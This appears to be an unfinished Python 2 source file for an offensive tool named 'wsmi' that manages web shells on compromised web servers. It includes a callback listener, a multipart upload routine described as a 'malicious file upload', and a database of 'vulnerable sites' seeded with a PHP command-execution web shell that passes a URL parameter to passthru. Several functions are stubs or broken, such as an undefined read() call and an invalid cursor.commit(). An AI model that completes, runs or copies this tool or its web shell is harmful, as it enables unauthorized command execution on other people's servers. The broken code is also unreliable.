import sqlite3
import signal
import sys
import urllib2
import threading
import socket
import shells
import encoders


#variables related to threading
database_lock = threading.Lock()#serialize access to the database

###next section is for threading combined with sockets
class threading_network_listener(threading.Thread):
	"""
		This class represents the ability for the program to thread off and
		set up a listener and makes an http request to trigger the candidate web shell
		sitting on the compromised web server.
	"""

	def __init__(self, port = None):
		threading.Thread.__init__(self)
		self.port = port#the intended port for the thread to listen on
		self.listen_sock = None#the actual socket listening on the port
		self.message = None

	def create_socket(self):
		""" Creates a socket for the thread to listen on """
		listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#create a socket
		listen_socket.bind(("", int(self.port)))#listens on any interface's ip address
		listen_socket.listen(5)#actually listen to a port
		print "socket bound to port ",self.port
		return listen_socket
	
	def run(self):
		self.socket = self.create_socket()

		#we only need to accept once in this scenario.
		(sock, address) = self.socket.accept()

		#print dir(sock)
		data = sock.recv(50)
		if(data == "ok"):
			global database_name
			global current_shell_id
			print str(data)

			#synchronize access to the database
			database_lock.acquire()
			conn = sqlite3.connect(database_name)	
			cursor = conn.cursor()
			cursor.execute("insert into open_ports(id,port_no) values (?,?)",[(current_shell_id),(self.port)])
			cursor.commit()
			database_lock.release()

		#cleanup
		sock.close()
		self.socket.close()
		print "closing socket"
		##TODO: move over to a curses interface because this print
		##statement is less than optimal

class threading_http_request(threading.Thread):
	"""
		Class that spawns off a thread to perform an http request.
		Will notify the threading_network_listener thread in the event
		of an error that the remote server can't connect back.
	"""
	def __init__(self):
		pass


database_name = ""
prompt = "wsmi>"
directory = ""
current_shell_id = 0

def print_banner():
	print "        _       __          __      _    __     __  __"
	print "       / \\      \\ \\        / /     |  | |     ||  "
	print "      /   \\      \\ \\      / /      |"
	print "     /_____\\      \\ \\    / /       |"

def upload_shell():
	"""
		Handles the interaction to the user to handle all the details
		of file uploading to the server.
	"""
	url = raw_input("url:")
	page = raw_input("page:")
	method = raw_input("http method:")
	file_name = raw_input("filename:")

def help():
	print "Interactive help menu type  help <module> to get more information on a module\n"
	print "upload-shell\t\t Upload a shell to target webserver"
	print "new-database\t\t Start a new database to keep track of webshells"
	print "view-shells\t\t View information about the currently running shells"

def router(command):
	"""
		Handles routing of functions that a simple dictionary will not accomplish
		Takes the last part of the command that the user entered and interprets it.
	"""
	global prompt
	global directory
	if command[0:6] == "shells":
		if len(command) == 6:
			prompt = "wsmi (shells)>"
			directory = "shells"
		elif command[6:] == "/php":
			prompt = "wsmi (shells/php)>"
			directory = "shells/php"

def get_input():
	""" gets the user's input and routes it accordingly"""
	global prompt
	userinput = raw_input(prompt)
	if userinput[:3] == "use":
		router(userinput[4:])
	else:
		try:
			functions[userinput]()
		except KeyError:
			print "caught error"

def traverse_up():
	"""
		Responsible for moving up the directory structure
	"""
	global directory

def initialize_database():
	"""
		Responsible for initializing a new database for storing user
		interactions with their webshells.Will prompt the user for a 
		database name and a new sqlite3	database will be created. The 
		only thing that will be committed is the changes to the schema
	"""
	
	name = raw_input("database name:")#prompting the user for a database name
	conn = sqlite3.connect(name)#creating the database
	global database_name
	database_name = name
	cursor = conn.cursor()

	#sample data for the time being
	try:
		cursor.execute("create table vulnerable_sites(url text,id integer, page text, method text, uploaded_shell text, attackurl text, language text)")
		cursor.execute("insert into vulnerable_sites(url,page,method,uploaded_shell,attackurl) values(?,?,?,?,?)",\
			[("www.google.com"),("upload.php"),("POST"),("<?php passthru($_GET['a']); ?>"),("www.google.com/view?id=5")])
		cursor.execute("create table open_ports(id integer, port_no integer, time text)")
		conn.commit()
	except sqlite3.OperationalError as e:
		print str(e)

def show_shells():
	"""
		Shows the currently uploaded shells at specified urls
	"""
	try:
		conn = sqlite3.connect(database_name)
		cursor = conn.cursor()
		query = "select attackurl from vulnerable_sites"
		cursor.execute(query)
		rows = cursor.fetchall()
		print "number\t\tattackurl"
		print "------\t\t---------"
		i=0
		for row in rows:
			print str(i)+'\t\t',row[0]
			i+=1
	except sqlite3.OperationalError:
		print "Need to have a database before you can view shells"

def exit():
	sys.exit(1)

def manage_random_list():
	"""
		good candidate for a python generator.
		Will manage a list of port numbers for scanning candidate shells
		randomly and not having a repeat in port numbers.
		will generate port numbers from 1025-65535(non privileged ports)
	"""
	port_list = []
	for i in range(1025,65536):
		port_list.append(i)
	dev_urand_file = open('/dev/urandom')
	rnd_nmb = read(dev_urand_file)
	print port_list

def run_candidate_threads(thread_count, timing):
	"""

	"""
	net_listen = threading_network_listener(65535)
	net_listen.start()
	
def check_candidacy():
	"""
		script that starts the process of checking a candidacy for a specific 
		web server.
	"""
	num_threads = raw_input("number of threads:")
	timing = raw_input("timing level(0-5):")
	run_candidate_threads(num_threads,timing)

def show_contents():
	global directory
	
	print "showing contents"

#a dictionary of functions that we can call based off of a user's input
functions = {
	"help":help,
	"upload-shell":upload_shell,
	"new-database":initialize_database,
	"view-shells":show_shells,
	"exit":exit,
	"quit":exit,
	"back":traverse_up,
	"show":show_contents,
	"check-candidacy":check_candidacy
}

def keyboardHandler(signal, frame):
		"""Handles keyboard interrupts and exits gracefully"""
		print ""
		sys.exit(0)
		#TODO: eventually write out to the database

def main():
	#handles keyboard interrupts gracefully
	signal.signal(signal.SIGINT, keyboardHandler)
	a = threading_network_listener()

	while 1:
		get_input()

def http_file_upload(url,filename):	
	"""
		Responsible for the actual uploading of a file.  Will handle the entirety of 
		uploading the file via http methods. 

		@param url the url of the malicious file upload
		@param filename the name of the file to upload at the moment must be inside the current directory
	"""
	file = open(filename,'r')
	file_contents = file.read()
	file.close()
	boundary = '-----------------WhenIwalkIntheClub'
	headers = {'User-Agent':'Mozilla 5.0',
				'Content-Type':'multipart/form-data; boundary='+boundary,}
	data = boundary + '\r\n' + "Content-Disposition: form-data; name=\"MAX FILE SIZE\"\r\n\r\n100000\r\n"
	data += boundary + '\r\nContent-Disposition: form-data; name="uploadedfile";name="' + filename + "\"\r\n"
	data += "Content-Type: application/x-object\r\n\r\n"+file_contents+'\r\n'+boundary+'--\r\n'
	request = urllib2.Request(url,data,headers)

#main()
manage_random_list()